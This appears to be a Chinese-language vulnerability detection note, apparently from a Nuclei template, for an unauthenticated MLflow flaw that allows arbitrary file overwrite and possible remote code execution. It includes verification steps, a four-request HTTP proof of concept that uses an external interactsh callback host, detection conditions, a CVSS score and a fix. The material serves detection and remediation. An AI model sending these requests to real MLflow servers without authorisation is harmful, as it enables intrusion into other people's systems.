验证漏洞存在方法
    - 检查MLflow实例是否可公开访问且未启用身份验证
    - 尝试访问MLflow的Web界面，确认无需身份验证即可访问

漏洞利用方法
    - 攻击者可以在没有身份验证的情况下覆盖MLflow服务器上的任何文件
    - 未经身份验证的攻击者可以覆盖MLflow服务器上的任何文件，可能破坏系统完整性并实现远程代码执行
    
PoC:
```http
POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name": "{{model_name}}"}

POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name": "{{model_name}}", "source": "http://{{interactsh-url}}/api/2.0/mlflow-artifacts/artifacts/"}

POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name": "{{model_name}}", "source": "models:/{{model_name}}/1"}

GET /model-versions/get-artifact?path=random&name={{model_name}}&version=2 HTTP/1.1
Host: {{Hostname}}
```

变量说明:
- `{{Hostname}}`: 目标MLflow实例的主机名
- `{{model_name}}`: 随机生成的模型名称（6位字母）
- `{{interactsh-url}}`: 用于检测交互的URL

检测条件:
- 成功接收到来自interactsh的HTTP协议交互
- 第一个请求的响应体包含"registered_model":和"name":字段

影响评估:
- CVSS评分: 9.8 (严重)
- 攻击向量: 网络
- 攻击复杂度: 低
- 权限要求: 无
- 用户交互: 无
- 影响范围: 机密性(高)、完整性(高)、可用性(高)

修复建议:
- 为MLflow实例实施身份验证和访问控制
